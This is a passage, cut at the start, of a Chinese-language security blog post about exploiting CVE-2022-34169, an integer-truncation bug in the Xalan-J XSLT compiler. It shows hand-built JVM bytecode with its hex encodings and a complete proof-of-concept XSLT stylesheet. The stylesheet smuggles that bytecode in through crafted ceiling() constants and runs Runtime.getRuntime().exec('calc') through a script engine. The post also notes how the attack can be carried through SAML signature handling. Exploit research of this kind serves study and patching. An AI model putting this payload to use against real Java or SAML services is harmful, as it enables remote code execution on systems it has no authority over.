class="line">0x2a                     ; aload_0</span><br><span class="line">0xb7008f                 ; invokespecial AbstractTranslet.&lt;init&gt;</span><br><span class="line">0x00 0x00 0x00           ; nop nop nop</span><br><span class="line">0x3c2ab7008f000000</span><br><span class="line"></span><br><span class="line">0x06                     ; iconst_6</span><br><span class="line">0x3c                     ; istore_1</span><br><span class="line">0xbb0078                 ; _new ScriptEngineManager</span><br><span class="line">0x59                     ; dup</span><br><span class="line">0x00 0x00 0x00           ; nop nop nop</span><br><span class="line">0x3cbb007859000000</span><br><span class="line"></span><br><span class="line">0x06                     ; iconst_6</span><br><span class="line">0x3c                     ; istore_1</span><br><span class="line">0xb7007a                 ; invokespecial ScriptEngineManager.&lt;init&gt;</span><br><span class="line">0x3a05                   ; astore 5</span><br><span class="line">0x00 0x00                ; nop nop</span><br><span class="line">0x3cb7007a3a050000</span><br><span class="line"></span><br><span class="line">0x06                     ; iconst_6</span><br><span class="line">0x3c                     ; istore_1</span><br><span class="line">0x1905                   ; aload 5</span><br><span class="line">0x127c                   ; ldc js</span><br><span class="line">0xb60080                 ; invokevirtual getEngineByName</span><br><span class="line">0x3c1905127cb60080</span><br><span class="line"></span><br><span class="line">0x06                     ; iconst_6</span><br><span class="line">0x3c                     ; istore_1</span><br><span class="line">0x3a06                   ; astore 6</span><br><span class="line">0x1906                   ; aload 6</span><br><span class="line">0x00 0x00 0x00           ; nop nop nop</span><br><span class="line">0x3c3a061906000000</span><br><span class="line"></span><br><span class="line">0x06                     ; iconst_6</span><br><span class="line">0x3c                     ; istore_1</span><br><span class="line">0x1282                   ; ldc java.lang.Runtime.getRuntime().exec(&quot;calc&quot;)</span><br><span class="line">0xb900880200             ; invokeinterface ScriptEngine.eval</span><br><span class="line">0x3c1282b900880200</span><br><span class="line"></span><br><span class="line">0x06                     ; iconst_6</span><br><span class="line">0x3c                     ; istore_1</span><br><span class="line">0x57                     ; pop</span><br><span class="line">0xb1                     ; return</span><br><span class="line">0x3c57b1</span><br></pre></td></tr></table></figure>

<p>更改完 code 之后，一定要记得修改 code.attribute_length 。如果在原版的基础上修改，很容易忘掉这个属性，一定要根据生成的 code 的长度重新确定长度：</p>
<p><img src="/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707192105284.png" alt="image-20240707192105284"></p>
<p>其他的和前面的 poc 一样。</p>
<p>完整的 poc 如下，我是在本地 jdk212 的环境下成功的，理论上在下面表格区间的都属于同一个版本，因此都应该可以：</p>
<p><img src="/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/image-20240707192114458.png" alt="image-20240707192114458"></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:template</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;se:eval(sem:getEngineByName(sem:new(),&#x27;js&#x27;), &#x27;java.lang.Runtime.getRuntime().exec(<span class="symbol">&amp;quot;</span>calc<span class="symbol">&amp;quot;</span>)&#x27;)&quot;</span> </span></span><br><span class="line"><span class="tag">		<span class="attr">xmlns:se</span>=<span class="string">&quot;http://xml.apache.org/xalan/java/javax.script.ScriptEngine&quot;</span> <span class="attr">xmlns:sem</span>=<span class="string">&quot;http://xml.apache.org/xalan/java/javax.script.ScriptEngineManager&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;at:new()&quot;</span> <span class="attr">xmlns:at</span>=<span class="string">&quot;http://xml.apache.org/xalan/java/com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">AAA</span> <span class="attr">GregorSamsa</span>=<span class="string">&quot;<span class="symbol">&amp;lt;</span>init<span class="symbol">&amp;gt;</span>&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&#x27;ceiling(133829)&#x27;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&#x27;ceiling(133830)&#x27;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&#x27;ceiling(133831)&#x27;</span>/&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- add 86 constants here --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&quot;es:tokenize(.)&quot;</span> <span class="attr">xmlns:es</span>=<span class="string">&quot;http://xml.apache.org/xalan/java/com.sun.org.apache.xalan.internal.lib.ExsltStrings&quot;</span>/&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- add 1520 constants here --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&#x27;ceiling(133840)&#x27;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&#x27;ceiling(133841)&#x27;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&#x27;ceiling(133842)&#x27;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">afP</span> <span class="attr">t1050</span>=<span class="string">&quot;t1051&quot;</span> /&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--not change--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&#x27;ceiling(0.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008344026969402015)&#x27;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&#x27;ceiling(0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007426408601593105)&#x27;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&#x27;ceiling(0.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000012025197585)&#x27;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&#x27;ceiling(0.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000139209290846069)&#x27;</span>/&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--not change --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&#x27;ceiling(0.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000387190546)&#x27;</span>/&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- 0x00520000004900ff --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&#x27;ceiling(0.0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004005132949095041)&#x27;</span>/&gt;</span></span><br><span class="line">		<span class="comment">&lt;!--code length:3d --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&#x27;ceiling(0.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005056318096)&#x27;</span>/&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- 0x3c2ab7008f000000 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&#x27;ceiling(0.00000000000000000072410752181298015)&#x27;</span>/&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- 0x3cbb007859000000 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&#x27;ceiling(0.0000000000000003747257554184825)&#x27;</span>/&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- 0x3cb7007a3a050000 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&#x27;ceiling(0.00000000000000031921500207725516)&#x27;</span>/&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- 0x3c1905127cb60080 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&#x27;ceiling(0.0000000000000000003390816997511928)&#x27;</span>/&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- 0x3c3a061906000000 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&#x27;ceiling(0.0000000000000000014107540725543966)&#x27;</span>/&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- 0x3c1282b900880200 --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&#x27;ceiling(0.00000000000000000025086588903817525)&#x27;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&#x27;ceiling(0.000000000000000005137254825097333)&#x27;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&#x27;ceiling(0.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011030899548897015)&#x27;</span>/&gt;</span></span><br><span class="line">		<span class="comment">&lt;!-- add 65508 constants here --&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">xsl:value-of</span> <span class="attr">select</span>=<span class="string">&#x27;ceiling(133835)&#x27;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="在-saml-中的应用"><a href="#在-saml-中的应用" class="headerlink" title="在 saml 中的应用"></a>在 saml 中的应用</h2><p>在 p0 的文章中提到可以用在 saml 中，如果 saml 的验签顺序有问题，则该攻击是成立的，虽然在碰到的大多数场景中，并不能派上用场，但是实际中还是碰到一些成功的案例，可以通过 reference URI 是否存在 ssrf 判断(参考：<a target="_blank" rel="noopener" href="https://speakerdeck.com/greendog/how-to-break-saml-if-i-have-paws)%E6%98%AF%E5%90%A6%E5%85%88%E6%89%A7%E8%A1%8C">https://speakerdeck.com/greendog/how-to-break-saml-if-i-have-paws)是否先执行</a> xslt 转换或者忽略 reference 验签错误，这两者都能触发漏洞。</p>
<p>btw，在上面的例子中，是指定了 xslt 的文件，最后生成的 class 会以文件名命名，在 saml 中，只能传递数据，没有文件名，因此会使用默认的名字：<code>GregorSamsa</code> 作为类名。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://speakerdeck.com/greendog/how-to-break-saml-if-i-have-paws">https://speakerdeck.com/greendog/how-to-break-saml-if-i-have-paws</a></p>
<p><a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2022/11/gregor-samsa-exploiting-java-xml.html">https://googleprojectzero.blogspot.com/2022/11/gregor-samsa-exploiting-java-xml.html</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/flowerwind/AutoGenerateXalanPayload">https://github.com/flowerwind/AutoGenerateXalanPayload</a></p>
<p><a target="_blank" rel="noopener" href="https://web.archive.org/web/20220925022952/https://blog.noah.360.net/xalan-j-integer-truncation-reproduce-cve-2022-34169/">https://web.archive.org/web/20220925022952/https://blog.noah.360.net/xalan-j-integer-truncation-reproduce-cve-2022-34169/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Archive</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B8%A9%E5%9D%91"><span class="toc-number">3.</span> <span class="toc-text">踩坑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E7%9A%84%E5%B7%AE%E5%BC%82"><span class="toc-number">4.</span> <span class="toc-text">不同版本的差异</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">5.</span> <span class="toc-text">任意代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8-saml-%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">在 saml 中的应用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">7.</span> <span class="toc-text">参考</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/&text=Xalan-J XSLT整数截断(cve-2022-34169)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/&title=Xalan-J XSLT整数截断(cve-2022-34169)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/&is_video=false&description=Xalan-J XSLT整数截断(cve-2022-34169)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Xalan-J XSLT整数截断(cve-2022-34169)&body=Check out this article: http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/&title=Xalan-J XSLT整数截断(cve-2022-34169)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/&title=Xalan-J XSLT整数截断(cve-2022-34169)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/&title=Xalan-J XSLT整数截断(cve-2022-34169)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/&title=Xalan-J XSLT整数截断(cve-2022-34169)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/&name=Xalan-J XSLT整数截断(cve-2022-34169)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/07/Xalan-J-XSLT%E6%95%B4%E6%95%B0%E6%88%AA%E6%96%AD-cve-2022-34169/&t=Xalan-J XSLT整数截断(cve-2022-34169)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2025
    wude
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Archive</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
